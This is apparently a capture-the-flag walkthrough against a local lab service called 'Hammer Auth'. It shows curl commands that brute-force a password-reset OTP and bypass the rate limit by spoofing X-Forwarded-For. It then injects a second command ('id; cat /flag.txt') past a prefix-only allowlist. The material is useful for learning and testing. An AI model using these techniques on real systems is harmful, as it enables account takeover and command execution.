# Finding the Bug

## Step 1: Enumerate the Service

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "service": "Hammer Auth v1.0",
  "endpoints": [
    "POST /forgot-password   -- request OTP for email",
    "POST /reset-password    -- submit OTP to get session token",
    "POST /execute           -- run command (requires Authorization header)"
  ]
}
```

## Step 2: Trigger the Rate Limit

Request an OTP, then hammer `/reset-password` without rotating headers:

```bash
curl -X POST http://localhost:8080/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@hammer.local"}'

for i in $(seq 1 12); do
  curl -s -X POST http://localhost:8080/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@hammer.local","otp":"0000"}'
done
```

After 10 attempts, the server returns 429. This confirms the rate limit exists and is keyed on something the app can read.

## Step 3: Check the Rate Limit Header

Look at the app behavior: each request from the same IP is counted once. Setting `X-Forwarded-For: 1.2.3.4` makes the counter increment for `1.2.3.4`, not your real IP. Changing the value on the next request starts a fresh counter.

## Step 4: Probe the Execute Endpoint

After getting a token, test what the allowlist blocks:

```bash
curl -X POST http://localhost:8080/execute \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id"}'
```

Then try:

```bash
curl -X POST http://localhost:8080/execute \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id; cat /flag.txt"}'
```

The second request succeeds. The check is `startswith("id")`, not `cmd == "id"`.
